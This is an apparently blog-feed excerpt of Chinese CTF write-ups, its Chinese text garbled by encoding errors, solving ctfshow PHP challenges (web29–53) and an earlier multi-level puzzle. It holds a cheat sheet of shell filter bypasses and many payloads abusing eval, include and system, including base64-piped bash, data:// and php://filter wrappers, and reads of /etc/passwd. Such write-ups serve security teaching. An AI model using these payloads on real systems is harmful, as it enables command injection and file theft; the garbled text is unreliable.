æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.&lt;/br&gt;"</span>;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"å¿«åˆ°éæ´²äº†"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"å»éæ´²å§"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸€å±‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ($num != $numPositve) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'æœ€å¼€å§‹ä¸Šé¢˜æ—¶å€™å¿˜å†™äº†è¿™ä¸ªï¼Œå¯¼è‡´è¿™level 1å˜æˆäº†å¼±æ™ºï¼Œæ€ªä¸å¾—è¿™ä¹ˆå¤šäººsolve'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//ä¼ æ•´æ•°ï¼Œä½†æ˜¯æ­£åˆ™è¿‡æ»¤äº†.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( $numPositve === $numReverse &amp;&amp; !isPalindrome($num) )&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br&gt;"</span>;</span><br><span class="line"> <span class="comment">//åˆ¤æ–­æ˜¯å›æ–‡ä¸²åˆä¸æ˜¯å›æ–‡ä¸²</span></span><br><span class="line">    </span><br><span class="line">    $numPositve = intval($num);</span><br><span class="line"><span class="keyword">if</span> ($num != $numPositve) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'æœ€å¼€å§‹ä¸Šé¢˜æ—¶å€™å¿˜å†™äº†è¿™ä¸ªï¼Œå¯¼è‡´è¿™level 1å˜æˆäº†å¼±æ™ºï¼Œæ€ªä¸å¾—è¿™ä¹ˆå¤šäººsolve'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//æ ¹æ®Yingå¸ˆå‚…åšå®¢å†™çš„è¿™é‡Œç”¨æµ®ç‚¹æ•°ç²¾åº¦çš„é—®é¢˜å°±å¯ä»¥ç»•è¿‡</span></span><br><span class="line">payload:num=<span class="number">1000000000000000.00000000000000010</span></span><br></pre></td></tr></table></figure>

<p>ç¬¬äºŒå±‚</p>
<p>MD5ç¡¬ç¢°</p>
<p>è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mport hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10</span>**<span class="number">33</span>):</span><br><span class="line">    i = str(i)</span><br><span class="line">    num = <span class="string">'0e'</span> + i</span><br><span class="line">    md5 = hashlib.md5(num.encode()).hexdigest()</span><br><span class="line">    md5 = hashlib.md5(md5.encode()).hexdigest()</span><br><span class="line">    <span class="comment"># print(md5)</span></span><br><span class="line">    <span class="keyword">if</span> md5[<span class="number">0</span>:<span class="number">2</span>] == <span class="string">'0e'</span> <span class="keyword">and</span> md5[<span class="number">2</span>:].isdigit():</span><br><span class="line">        print(<span class="string">'success str:&#123;&#125;  md5(str):&#123;&#125;'</span>.format(num, md5))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> int(i) % <span class="number">1000000</span> == <span class="number">0</span>:</span><br><span class="line">         print(i)</span><br><span class="line">//ç»“æœï¼š<span class="number">0e1138100474</span></span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸‰å±‚</p>
<p>banäº†å¾ˆå¤šå‘½ä»¤ï¼Œè¿™é‡Œå¯ä»¥ç”¨\æ–œæ æ¥ç»•è¿‡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">get_flag=ca\t&lt;flag.ph\p</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?num&#x3D;1000000000000000.00000000000000010&amp;md5&#x3D;0e1138100474&amp;get_flag&#x3D;ca\t&lt;flag.ph\p</span><br></pre></td></tr></table></figure>

<p>åœ¨ç½‘é¡µæºç å¤„æ‰¾åˆ°flag</p>
]]></content>
      <tags>
        <tag>show</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshowcommand</title>
    <url>/2020/09/22/ctfshowcommand/</url>
    <content><![CDATA[<h3 id="commandç»•è¿‡"><a href="#commandç»•è¿‡" class="headerlink" title="commandç»•è¿‡"></a>commandç»•è¿‡<a id="more"></a></h3><h4 id="çŸ¥è¯†æ€»ç»“ï¼Œå†™åœ¨å‰é¢"><a href="#çŸ¥è¯†æ€»ç»“ï¼Œå†™åœ¨å‰é¢" class="headerlink" title="çŸ¥è¯†æ€»ç»“ï¼Œå†™åœ¨å‰é¢"></a>çŸ¥è¯†æ€»ç»“ï¼Œå†™åœ¨å‰é¢</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">åˆ†éš”å‘½ä»¤</span><br><span class="line">;	<span class="comment">//åˆ†å·åº”è¯¥æ˜¯æœ€å¥½ç†è§£çš„</span></span><br><span class="line">|	<span class="comment">//åªæ‰§è¡Œåé¢é‚£æ¡å‘½ä»¤</span></span><br><span class="line">||	<span class="comment">//åªæ‰§è¡Œå‰é¢é‚£æ¡å‘½ä»¤</span></span><br><span class="line">&amp;	<span class="comment">//ä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯è‡ªå·±å§¿åŠ¿ä¸å¯¹ï¼Œæ²¡æˆåŠŸï¼Œä¸‹é¢ä¹Ÿæ˜¯ä¸€æ ·</span></span><br><span class="line">&amp;&amp;	<span class="comment">//ä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œ</span></span><br><span class="line"></span><br><span class="line">ç©ºæ ¼ç»•è¿‡</span><br><span class="line">&lt;</span><br><span class="line">&lt;&gt;	<span class="comment">//éœ€è¦å†™çš„æƒé™</span></span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$<span class="number">9</span></span><br><span class="line">%<span class="number">20</span></span><br><span class="line">%<span class="number">09</span></span><br><span class="line">%<span class="number">3</span>c</span><br><span class="line">A=$<span class="string">'cat\x20flag'</span>&amp;&amp;$A</span><br><span class="line">A=$<span class="string">'cat\x09flag'</span>&amp;&amp;$A</span><br><span class="line">é»‘åå•</span><br><span class="line"><span class="comment">//ä¸€èˆ¬æƒ…å†µåƒflagã€phpè¿™ç§å­—ç¬¦ä¼šè¢«banæ‰ï¼Œè¿™æ—¶å€™å°±éœ€è¦è¿›è¡Œç»•è¿‡äº†</span></span><br><span class="line">é€šé…ç¬¦</span><br><span class="line">*	<span class="comment">//åŒ¹é…ä»»ä½•æ–‡æœ¬æˆ–å­—ç¬¦ä¸²ï¼Œè¿™ä¸ªé€šè¿‡æµ‹è¯•å‘ç°å¹¶ä¸èƒ½ä¸IFSæˆ–&lt;è¿™ä¸¤ä¸ªå­—ç¬¦ä¸€èµ·ä½¿ç”¨</span></span><br><span class="line">?	<span class="comment">//åŒ¹é…å•ä¸ªä»»æ„å­—ç¬¦</span></span><br><span class="line"> </span><br><span class="line">ç©ºå­—ç¬¦</span><br><span class="line">$@	<span class="comment">//ca$@t flag</span></span><br><span class="line">$<span class="number">1</span>-$<span class="number">9</span>	<span class="comment">//ca$1t flag</span></span><br><span class="line">$&#123;æ•°å­—&#125;  <span class="comment">//ca$&#123;1&#125;t flag</span></span><br><span class="line"> </span><br><span class="line">ç¼–ç ç»•è¿‡</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Y2F0IGZsYWcucGhwCg=="</span>|base64 -d|bash	<span class="comment">//è§£ç ä¸ºcat flag.phpå¹¶æ‰§è¡Œ</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"cat flag.php"</span>|base64	<span class="comment">//æœ€å¥½åˆ«åœ¨åœ¨çº¿ç½‘ç«™ç¼–ç ï¼Œä¸ç„¶å¯èƒ½ä¼šå°†ç©ºæ ¼è½¬æˆurlç¼–ç ï¼Œä»è€Œæ— æ³•æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line"> </span><br><span class="line">å˜é‡æ›¿æ¢</span><br><span class="line">a=t;b=g;ca$a fla$b.php</span><br><span class="line"> </span><br><span class="line">å¼•å·</span><br><span class="line">ca<span class="string">''</span>t fl<span class="string">''</span>ag.php</span><br><span class="line"></span><br><span class="line">åæ–œæ†</span><br><span class="line"></span><br><span class="line">ca\t f\la\g.php</span><br><span class="line">LinuxæŸ¥çœ‹æ–‡ä»¶å‘½ä»¤</span><br><span class="line">cat		<span class="comment">//cat flag.php</span></span><br><span class="line">tac		<span class="comment">//tac flag.php</span></span><br><span class="line">head	<span class="comment">//head flag.php</span></span><br><span class="line">tail	<span class="comment">//tail flag.php</span></span><br><span class="line">nl		<span class="comment">//nl flag.php</span></span><br><span class="line">more	<span class="comment">//more flag.php</span></span><br><span class="line">less	<span class="comment">//less flag.php</span></span><br><span class="line">od		<span class="comment">//od flag.php</span></span><br><span class="line">grep	<span class="comment">//grep 'fla' flag.php</span></span><br><span class="line">strings	<span class="comment">//strings flag.php</span></span><br><span class="line">sort	<span class="comment">//sort flag.php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">localeconv()ï¼šè¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚å…¶ä¸­æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªä¸ºç‚¹å·(.)</span><br><span class="line">pos()ï¼šè¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ã€‚</span><br><span class="line">array_reverse()ï¼šæ•°ç»„é€†åº</span><br><span class="line">scandir()ï¼šè·å–ç›®å½•ä¸‹çš„æ–‡ä»¶</span><br><span class="line">next()ï¼š å‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</span><br></pre></td></tr></table></figure>







<h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/flag/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç®€å•è¿‡æ»¤äº†flag,ç”¨é€šé…ç¬¦å³å¯ç»•è¿‡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=system(<span class="string">"ls"</span>);</span><br><span class="line">c=system(<span class="string">'cat f*'</span>);</span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢çš„é¢˜ç›®éƒ½åªæ”¾æ ¸å¿ƒéƒ¨åˆ†</p>
<h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/flag|system|php/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å‘ç°è¿™é‡Œè¿‡æ»¤äº†phpå’Œsystem,å½±å“ä¸å¤§ï¼Œsystemçš„æ›¿ä»£å‡½æ•°æœ‰å¾ˆå¤šï¼Œåƒæ˜¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">shell_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br><span class="line">exec()</span><br><span class="line"><span class="comment">#è¿™é‡Œè¦æ³¨æ„é™¤äº†systeméƒ½æ˜¯ä¸ä¼šç»™å‡ºå›æ˜¾çš„ï¼Œè¦ç”¨è¯¸å¦‚echo,print_rç­‰æ¥å¸¦å‡ºç»“æœ</span></span><br></pre></td></tr></table></figure>

<p>ä¸æŸ¥çœ‹ç›®å½•ç»“æ„ç›´æ¥ç›²çŒœæ–‡ä»¶ä½ç½®ä¹Ÿæ˜¯å¯ä»¥çš„</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=<span class="keyword">echo</span> exec(<span class="string">'find / -name f*'</span>);</span><br><span class="line">c=<span class="keyword">echo</span> exec(<span class="string">'cat f*'</span>);</span><br></pre></td></tr></table></figure>

<h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/flag|system|php|cat|sort|shell|\.| |\'/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>æ–°åŠ äº†å‡ ä¸ªè¿‡æ»¤ï¼Œcat,sort,shell,ç©ºæ ¼ç­‰ï¼Œè¿˜æ˜¯å¾ˆå¥½ç»•è¿‡çš„ï¼Œä¸Šé¢çš„çŸ¥è¯†æ€»ç»“é‡Œæœ‰ï¼Œè¿™é‡Œå°±ä¸èµ˜è¿°äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=<span class="keyword">echo</span>(`ls`);</span><br><span class="line">c=<span class="keyword">echo</span>(`c\at%<span class="number">09</span>f*`);</span><br></pre></td></tr></table></figure>

<h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é¢˜è¿‡æ»¤çš„ä¸œè¥¿å˜å¤šäº†ï¼Œå•å¼•å·ï¼Œåˆ†å·ï¼Œæ‰“å°echoç­‰éƒ½è¢«è¿‡æ»¤äº†</p>
<p>è¿™é‡Œå¯ä»¥å°è¯•åŒ…å«</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=<span class="keyword">include</span><span class="string">"/etc/passwd"</span><span class="meta">?&gt;</span></span><br><span class="line">å¯ä»¥æˆåŠŸæ‰§è¡Œï¼Œè€ƒè™‘å†™å…¥å°ğŸ</span><br><span class="line">c=<span class="keyword">include</span><span class="string">"$_POST[1]"</span><span class="meta">?&gt;</span></span><br><span class="line">POST:<span class="number">1</span>=/etc/passwd</span><br><span class="line">æœ€åå¯ä»¥ç”¨ä¼ªåè®®</span><br><span class="line">c=<span class="keyword">include</span><span class="string">"$_POST[1]"</span><span class="meta">?&gt;</span></span><br><span class="line">POST:php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>

<h3 id="web33-35-payloadåŒweb32ï¼Œè¿‡æ»¤åŸºæœ¬ç›¸åŒ"><a href="#web33-35-payloadåŒweb32ï¼Œè¿‡æ»¤åŸºæœ¬ç›¸åŒ" class="headerlink" title="web33-35(payloadåŒweb32ï¼Œè¿‡æ»¤åŸºæœ¬ç›¸åŒ)"></a>web33-35(payloadåŒweb32ï¼Œè¿‡æ»¤åŸºæœ¬ç›¸åŒ)</h3><h3 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h3><p>å¤šè¿‡æ»¤äº†æ•°å­—ï¼Œpostä¼ é€’çš„å‚æ•°æ¢æˆå­—æ¯å³å¯</p>
<h3 id="web37-åŒ39"><a href="#web37-åŒ39" class="headerlink" title="web37(åŒ39)"></a>web37(åŒ39)</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/flag/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">include</span>($c);</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>æ¢äº†å½¢å¼çš„ä»£ç ï¼Œè¿™é‡Œä¼šå¯¹è¾“å…¥è¿›è¡ŒåŒ…å«ï¼Œè¿™é‡Œç¬¬ä¸€ååº”å°±æ˜¯å†™å…¥å°é©¬ï¼Œä¹Ÿå°±æ˜¯åˆ©ç”¨ä¸€å¥è¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#paylaod</span></span><br><span class="line">c=data:text/plain,<span class="meta">&lt;?php</span> system(<span class="string">'ls'</span>)<span class="meta">?&gt;</span></span><br><span class="line">c=data:text/plain,<span class="meta">&lt;?php</span> system(<span class="string">'cat f*'</span>)<span class="meta">?&gt;</span></span><br><span class="line">ç›¸å½“äºæ‰§è¡Œäº†phpè¯­å¥<span class="meta">&lt;?php</span> system(<span class="string">'cat f*'</span>)<span class="meta">?&gt;</span>.php</span><br><span class="line">å› ä¸ºå‰é¢çš„phpè¯­å¥å·²ç»é—­åˆäº†ï¼Œæ‰€ä»¥åé¢çš„.phpä¼šè¢«å½“æˆhtmlé¡µé¢ç›´æ¥æ˜¾ç¤ºåœ¨é¡µé¢ä¸Š</span><br></pre></td></tr></table></figure>

<h3 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/flag|php|file/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">include</span>($c);</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè¿˜æ˜¯èƒ½å¤Ÿç”¨dataä¼ªåè®®ç»•è¿‡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=data:text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></pre></td></tr></table></figure>

<p>è¿˜å¯ä»¥åœ¨UAå†™å…¥ä¸€å¥è¯ï¼ŒåŒ…å«æ—¥å¿—æ–‡ä»¶</p>
<h3 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\ï¼ˆ|\ï¼‰|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\'|\"|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>é™¤äº†å­—æ¯ï¼Œä¸€äº›ç‰¹æ®Šå­—ç¬¦åŸºæœ¬éƒ½è¢«è¿‡æ»¤äº†</p>
<p>è¿™é“é¢˜å’ŒGXYç¦æ­¢å¥—å¨ƒè§£æ³•ç›¸åŒï¼Œåˆ©ç”¨ç‰¹æ®Šçš„å‡½æ•°è¿›è¡Œç»•è¿‡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#</span></span><br><span class="line">c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line">å…·ä½“å‡½æ•°åŠŸèƒ½çœ‹æœ€å‰éƒ¨åˆ†</span><br></pre></td></tr></table></figure>

<h3 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">'c'</span>];</span><br><span class="line">    system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæ¶‰åŠåˆ°linuxå‘½ä»¤ä¸­çš„åˆ†éš”ç¬¦ï¼Œå‰é¢æ€»ç»“ä¸­æœ‰</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=ls;</span><br><span class="line">c=cat flag.php;||c=cat f*;</span><br></pre></td></tr></table></figure>

<h3 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº†åˆ†éš”ç¬¦å¼•å·å’Œæ–‡æœ¬è¯»å–cat</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=ls||</span><br><span class="line">c=c\at f*||</span><br></pre></td></tr></table></figure>

<h3 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/;|cat|flag/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>å¤šè¿‡æ»¤äº†flagï¼Œé€šé…ç¬¦å³å¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=ls||</span><br><span class="line">c=c\at f*||</span><br></pre></td></tr></table></figure>

<h3 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| /i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>å¤šäº†ä¸ªç©ºæ ¼è¢«è¿‡æ»¤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at%<span class="number">09</span>f*||</span><br></pre></td></tr></table></figure>

<h3 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\\$|\*/i"</span>, $c))&#123;</span><br><span class="line">    system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¢åŠ æ•°å­—è¿‡æ»¤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at&lt;&gt;f%<span class="number">27</span>%<span class="number">27</span>lag.php||</span><br><span class="line">c=nl&lt;fl<span class="string">''</span>ag.php||</span><br></pre></td></tr></table></figure>

<h3 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢˜çš„payloadèƒ½æ‰“é€š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at&lt;&gt;f%<span class="number">27</span>%<span class="number">27</span>lag.php||</span><br></pre></td></tr></table></figure>

<h3 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>åŒä¸Šé¢˜payloadï¼Œå¢åŠ çš„è¿‡æ»¤æ— å½±å“</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at&lt;&gt;f%<span class="number">27</span>%<span class="number">27</span>lag.php||</span><br></pre></td></tr></table></figure>

<h3 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>å¤šè¿‡æ»¤äº†ç™¾åˆ†å·ï¼ŒåŒä¸Šé¢˜</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at&lt;&gt;f%<span class="number">27</span>%<span class="number">27</span>lag.php||</span><br></pre></td></tr></table></figure>

<h3 id="web50-51"><a href="#web50-51" class="headerlink" title="web50-51"></a>web50-51</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>å¢åŠ åå…­è¿›åˆ¶å¯¹åˆ¶è¡¨ç¬¦ç­‰çš„è¿‡æ»¤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at&lt;&gt;f%<span class="number">27</span>%<span class="number">27</span>lag.php||</span><br></pre></td></tr></table></figure>

<h3 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">" &gt;/dev/null 2&gt;&amp;1"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº†å°–æ‹¬å·ï¼Œç©ºæ ¼æ¢ç§æ–¹å¼ç»•è¿‡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at$IFS/fl%<span class="number">27</span>%<span class="number">27</span>ag||</span><br></pre></td></tr></table></figure>

<h3 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">echo</span>($c);</span><br><span class="line">        $d = system($c);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>.$d;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>æ”¹å˜äº†å½¢å¼ï¼Œä¸å†éœ€è¦å‘½ä»¤åˆ†éš”ç¬¦</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=c\at$&#123;IFS&#125;fl%<span class="number">27</span>%<span class="number">27</span>ag.php</span><br></pre></td></tr></table></figure>

